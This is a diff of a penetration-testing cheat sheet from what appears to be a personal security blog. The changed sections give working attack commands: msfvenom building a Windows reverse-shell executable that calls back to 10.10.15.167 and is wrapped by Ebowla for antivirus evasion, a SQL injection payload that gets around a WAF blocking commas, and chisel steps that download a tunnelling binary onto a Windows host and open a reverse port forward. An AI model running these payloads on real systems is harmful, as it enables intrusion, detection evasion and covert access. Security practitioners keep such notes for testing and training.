@@ -1,4 +1,4 @@
-# [snovvcrash’s Security Blog](https://snovvcrash.github.io)
+[**snovvcrash’s Security Blog**](https://snovvcrash.github.io)
 
 [//]: # (# -- 5 spaces before)
 [//]: # (## -- 4 spaces before)
@@ -653,9 +653,10 @@ PS> cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xml
 ### Ebowla
 
 ```
-root@kali:$ git clone https://github.com/Genetic-Malware/Ebowla /opt/Ebowla && cd /opt/Ebowla
-root@kali:$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.167 LPORT=1337 --platform win -f exe -a x64 -o /tmp/rev.exe
-root@kali:$ pip install configobj
+root@kali:$ sudo git clone https://github.com/Genetic-Malware/Ebowla /opt/Ebowla && cd /opt/Ebowla
+root@kali:$ sudo apt install golang wine -y
+root@kali:$ sudo python -m pip install configobj pyparsing pycrypto pyinstaller
+root@kali:$ sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.167 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
 root@kali:$ vi genetic.config
 ...Edit output_type, payload_type, ENV_VAR...
 root@kali:$ python ebowla.py /tmp/rev.exe genetic.config && rm /tmp/rev.exe
@@ -903,6 +904,14 @@ name=snovvcrash&email=admin%example.com++++++++++11&password=qwe123
 ```
 
 * [www.youtube.com/watch?v=F1Tm4b57ors](https://www.youtube.com/watch?v=F1Tm4b57ors)
+
+
+
+### Commas blocked by WAF
+
+```
+id=-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b ON 1=1#
+```
 
 
 
@@ -1182,15 +1191,21 @@ root@kali:$ nslookup
 Reverse forward port 1111 from Windows machine to port 2222 on Linux machine:
 
 ```
-root@kali:$ wget [1/linux] -O chisel && chmod +x chisel
-root@kali:$ wget [1/windows] -O chisel.exe && upx chisel.exe
+root@kali:$ wget [1/linux] -O chisel.gz && gunzip chisel.gz && ls chisel*
+root@kali:$ mv chisel_??? chisel && chmod +x chisel
+
+root@kali:$ wget [1/windows] -O chisel.exe.gz && gunzip chisel.exe.gz && ls chisel*
+root@kali:$ mv chisel_???.exe chisel.exe && upx chisel.exe
 root@kali:$ md5sum chisel.exe
+
 root@kali:$ ./chisel server -p 8000 -v -reverse
 
 PS> (new-object net.webclient).downloadfile("http://127.0.0.1/chisel.exe", "$env:userprofile\music\chisel.exe")
 PS> get-filehash -alg md5 chisel.exe
 PS> Start-Process -NoNewWindows chisel.exe client 127.0.0.1:8000 R:127.0.0.1:2222:127.0.0.1:1111
 ```
+
+1. [github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)
 
 
 
